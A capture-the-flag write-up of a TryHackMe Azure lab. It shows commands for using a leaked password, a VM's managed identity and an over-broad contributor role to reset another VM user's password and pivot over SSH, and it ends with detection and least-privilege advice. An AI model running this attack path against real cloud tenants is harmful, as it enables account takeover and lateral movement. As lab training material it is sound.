
# TryHackMe - Azure: Hoppity Hop Writeup

## 📖 Scenario Overview
In this cloud penetration testing challenge, we are provided with a compromised password (`WhereIsMyMind$#@!`) and tasked with exploring an Azure tenant to discover an attack path. The goal is to demonstrate lateral movement and privilege escalation within an Azure environment without tampering with the infrastructure.

## 👣 Step-by-Step Execution

### 1. Initial Access
From the Azure Portal, I navigated to the All resources and identified two virtual machines in the assigned resource group (`<ResourceGroup>`): `LinuxVM` and `LinuxVM1`.
Using the compromised password and the public IP of `LinuxVM`, I established an SSH connection:
```bash
ssh azureuser@<LinuxVM_Public_IP>

```

### 2. Managed Identity Reconnaissance

Once inside `LinuxVM`, I operated under an "Assume Breach" scenario. Instead of hunting for local credentials, I leveraged the VM's System-Assigned Managed Identity to authenticate directly against the Azure API:

```bash
azureuser@LinuxVM:~$ az login --identity

```

This authenticated me as `systemAssignedIdentity`, allowing me to query Azure resources without needing a user account.

I enumerated the resource group and the VMs within it:

```bash
azureuser@LinuxVM:~$ az group list -o table
azureuser@LinuxVM:~$ az vm list -g <ResourceGroup> -o table

```

### 3. RBAC Enumeration (Finding the Misconfiguration)

To understand what my current Managed Identity was allowed to do, I queried its specific Principal ID and checked its Role Assignments:

```bash
azureuser@LinuxVM:~$ az vm identity show -g <ResourceGroup> -n LinuxVM
azureuser@LinuxVM:~$ az role assignment list --assignee <principalID> --scope /subscriptions/<subscriptionID>/resourceGroups/<ResourceGroup> -o table

```

*Result:* The Managed Identity had the **Virtual Machine Contributor** role assigned at the Resource Group scope.

I inspected the specific permissions of this role using the Role Definition ID from the previous output:

```bash
azureuser@LinuxVM:~$ az role definition show --id /subscriptions/<subscriptionID>/providers/Microsoft.Authorization/roleDefinitions/<roleDefinitionID> --query "permissions"

```

The output revealed a critical over-permissive wildcard: `"Microsoft.Compute/virtualMachines/*"`. This means the compromised VM had full administrative control over all other VMs within the same resource group.

### 4. Lateral Movement via VM Extensions

Abusing the `Virtual Machine Contributor` permissions, I targeted the second machine, `LinuxVM1`. Using the `VMAccessForLinux` extension (a legitimate Azure administrative tool designed for password resets), I forced a password change for the user `tyler` on `LinuxVM1`:

```bash
azureuser@LinuxVM:~$ az vm user update -u tyler -p 'PassPwned1!' -n LinuxVM1 -g <ResourceGroup>

```

### 5. Capturing the Flag

With the password successfully changed via the Azure Control Plane, I pivoted to `LinuxVM1` using standard SSH from my initial foothold:

```bash
azureuser@LinuxVM:~$ ssh tyler@<LinuxVM1_Public_IP>

```

Once logged in, I retrieved the flag:

```bash
tyler@LinuxVM1:~$ cat flag.txt
THM{<flag_hash_here>}

```

---

## 🛡️ Defender's Perspective & SOC Detection

This attack path highlights the severe risks of assigning over-permissive roles to Managed Identities. To detect and prevent this in a real-world environment:

1. **Least Privilege:** A VM should rarely have the `Virtual Machine Contributor` role over its entire Resource Group. Scopes should be restricted strictly to the required resources (e.g., a specific Key Vault or Storage Account).
2. **Monitoring Azure Activity Logs:** SOC teams should monitor for the `Microsoft.Compute/virtualMachines/extensions/write` operation. If this operation is initiated by a System-Assigned Managed Identity rather than a human administrator, it strongly indicates a potential abuse of the `VMAccess` extension to reset credentials or execute code.
3. **Identity Protection:** Implement alerting for anomalous sign-ins or unusual Azure CLI usage patterns originating from internal Azure Datacenter IP ranges.
